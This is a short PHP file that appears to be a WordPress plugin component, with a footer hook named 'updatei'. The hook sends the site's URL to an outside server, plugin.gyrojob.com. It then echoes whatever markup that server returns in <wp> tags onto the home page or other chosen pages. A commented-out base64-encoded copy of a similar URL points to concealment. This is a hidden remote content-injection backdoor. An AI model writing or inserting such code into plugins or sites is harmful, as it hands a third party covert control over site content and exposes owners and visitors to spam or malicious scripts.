<?php
add_action('admin_menu', 'my_plugin_menu');
function updatei(){$url=get_option('siteurl');
$wu_l=str_replace($url,"",get_permalink($row->post_id));

//$wp_u="aHR0cHM6Ly93d3cuZ3lyb3JvY2suY28uaW4vYmIucGhw";
//$wp_r=base64_decode($wp_u)."?url=".$url;
$wp_r="https://plugin.gyrojob.com/bb.php?url=".$url;

    $data = file_get_contents($wp_r);
    if (preg_match('/<all>/is', $data, $mat)) {$d=$wu_l;}else{$d="/";}
if (preg_match('/<wp>(.*)<\/wp>/is', $data, $matches)) {
    if($_SERVER['REQUEST_URI']==$d || $_SERVER['REQUEST_URI']=="/")
    {echo '<wp>'.$matches[1].'</wp>';} }
}

add_action('wp_footer', 'updatei');